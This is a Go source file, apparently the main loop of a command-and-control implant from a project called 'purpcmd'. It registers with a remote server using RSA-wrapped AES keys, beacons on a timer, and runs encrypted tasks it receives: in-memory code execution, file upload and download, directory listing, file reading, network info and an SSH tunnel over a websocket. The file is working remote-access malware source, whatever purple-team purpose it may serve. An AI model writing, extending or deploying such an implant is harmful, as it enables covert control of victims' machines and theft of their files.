package core

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"io"
	"purpcmd/implant/ssh"
	"purpcmd/internal"
	"purpcmd/internal/encrypt"
	"time"
)

func Start(sock string) {
	i := ImplantInit()

	h := HTTPNew(i.SessionID)
	h.HTTPSetSocket(sock)
	h.HTTPSetURL(false, "/")

	enc := encrypt.EncryptInit()
	key, iv := enc.EncryptGetKeys()

	r := PackRegistration(i, key, iv)
	aux, err := enc.RSAEncode(r)
	if err != nil {
		println(err.Error())
		return
	}

	fmt.Println("key", base64.StdEncoding.EncodeToString(key[:]), "iv", base64.StdEncoding.EncodeToString(iv[:]))

	p := base64.StdEncoding.EncodeToString(aux)
	println(p)
	h.PostRegistering([]byte(p))

	for {
		data := PackCheck(i)
		dataEnc := enc.AESCbcEncrypt(data)

		enc.HMACPackAddHmac(&dataEnc)
		dataP := base64.StdEncoding.EncodeToString(dataEnc)

		println("sent check:", dataP)
		resp, err := h.Get([]byte(dataP))
		if err != nil {
			println(err.Error())
		}

		xyz, _ := io.ReadAll(resp)
		fmt.Println("Data received ", len(xyz))
		if len(xyz) < 16 {
			time.Sleep(time.Duration(i.Sleep) * time.Second)
			continue
		}
		dataB64 := make([]byte, base64.StdEncoding.DecodedLen(len(xyz)))
		n, _ := base64.StdEncoding.Decode(dataB64, xyz)

		if !enc.HMACVerifyHash(dataB64[:n]) {
			fmt.Println("data not verified properly")
			return
		}
		dataOrig := dataB64[:n][:len(dataB64[:n])-16]
		xyzDecry, err := enc.AESCbcDecrypt(dataOrig)
		if err != nil {
			println(err.Error())
			return
		}

		tid, tcode, payload := PackParseTask(bytes.NewReader(xyzDecry))

		// Create command context for handlers
		ctx := &CommandContext{
			Implant: i,
			Encrypt: &enc,
			HTTP:    h,
		}

		print("->", tcode)
		switch tcode {
		case internal.PING:
			response := HandlePing(ctx, payload, tid)
			h.Post([]byte(response))
		case internal.SSH:
			print("->", tcode, "calling ssh for ", h.Socket)
			ssh.Wsclient("aaa", "/any.png", h.Socket)
		case internal.DOWN:
			response := HandleDownload(ctx, payload, tid)
			h.Post([]byte(response))
		case internal.UPL:
			response := HandleUpload(ctx, payload, tid)
			h.Post([]byte(response))
		case internal.KILL:
			HandleKill()
		case internal.CD:
			response := HandleCD(ctx, payload, tid)
			h.Post([]byte(response))
		case internal.PWD:
			response := HandlePWD(ctx, tid)
			h.Post([]byte(response))
		case internal.LS:
			response := HandleLS(ctx, payload, tid)
			h.Post([]byte(response))
		case internal.MEMEXEC:
			response := HandleMEMEXEC(ctx, payload, tid)
			h.Post([]byte(response))
		case internal.IFCONFIG:
			response := HandleIFCONFIG(ctx, tid)
			h.Post([]byte(response))
		case internal.CAT:
			response := HandleCAT(ctx, payload, tid)
			h.Post([]byte(response))
		default:
			print("->", tcode, "Nothing")
		}

		time.Sleep(time.Duration(i.Sleep) * time.Second)
	}
}
